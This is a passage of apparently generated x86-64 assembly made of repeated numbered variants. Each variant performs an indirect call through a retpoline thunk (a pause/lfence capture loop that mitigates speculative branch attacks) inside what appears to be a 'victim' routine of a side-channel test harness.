	jmp	.Lvictim_win0_continue
## Variant 470
.Lvictim_win0_var470:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000470
	jmp	.Lgg_retpol_after_000470
.Lgg_retpol_thunk_000470:
	callq	.Lgg_retpol_setup_000470
.Lgg_retpol_cap_000470:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000470
.Lgg_retpol_setup_000470:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000470:
	jmp	.Lvictim_win0_continue
## Variant 471
.Lvictim_win0_var471:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000471
	jmp	.Lgg_retpol_after_000471
.Lgg_retpol_thunk_000471:
	callq	.Lgg_retpol_setup_000471
.Lgg_retpol_cap_000471:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000471
.Lgg_retpol_setup_000471:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000471:
	jmp	.Lvictim_win0_continue
## Variant 472
.Lvictim_win0_var472:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000472
	jmp	.Lgg_retpol_after_000472
.Lgg_retpol_thunk_000472:
	callq	.Lgg_retpol_setup_000472
.Lgg_retpol_cap_000472:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000472
.Lgg_retpol_setup_000472:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000472:
	jmp	.Lvictim_win0_continue
## Variant 473
.Lvictim_win0_var473:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000473
	jmp	.Lgg_retpol_after_000473
.Lgg_retpol_thunk_000473:
	callq	.Lgg_retpol_setup_000473
.Lgg_retpol_cap_000473:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000473
.Lgg_retpol_setup_000473:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000473:
	jmp	.Lvictim_win0_continue
## Variant 474
.Lvictim_win0_var474:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000474
	jmp	.Lgg_retpol_after_000474
.Lgg_retpol_thunk_000474:
	callq	.Lgg_retpol_setup_000474
.Lgg_retpol_cap_000474:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000474
.Lgg_retpol_setup_000474:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000474:
	jmp	.Lvictim_win0_continue
## Variant 475
.Lvictim_win0_var475:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000475
	jmp	.Lgg_retpol_after_000475
.Lgg_retpol_thunk_000475:
	callq	.Lgg_retpol_setup_000475
.Lgg_retpol_cap_000475:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000475
.Lgg_retpol_setup_000475:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000475:
	jmp	.Lvictim_win0_continue
## Variant 476
.Lvictim_win0_var476:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000476
	jmp	.Lgg_retpol_after_000476
.Lgg_retpol_thunk_000476:
	callq	.Lgg_retpol_setup_000476
.Lgg_retpol_cap_000476:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000476
.Lgg_retpol_setup_000476:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000476:
	jmp	.Lvictim_win0_continue
## Variant 477
.Lvictim_win0_var477:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000477
	jmp	.Lgg_retpol_after_000477
.Lgg_retpol_thunk_000477:
	callq	.Lgg_retpol_setup_000477
.Lgg_retpol_cap_000477:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000477
.Lgg_retpol_setup_000477:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000477:
	jmp	.Lvictim_win0_continue
## Variant 478
.Lvictim_win0_var478:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000478
	jmp	.Lgg_retpol_after_000478
.Lgg_retpol_thunk_000478:
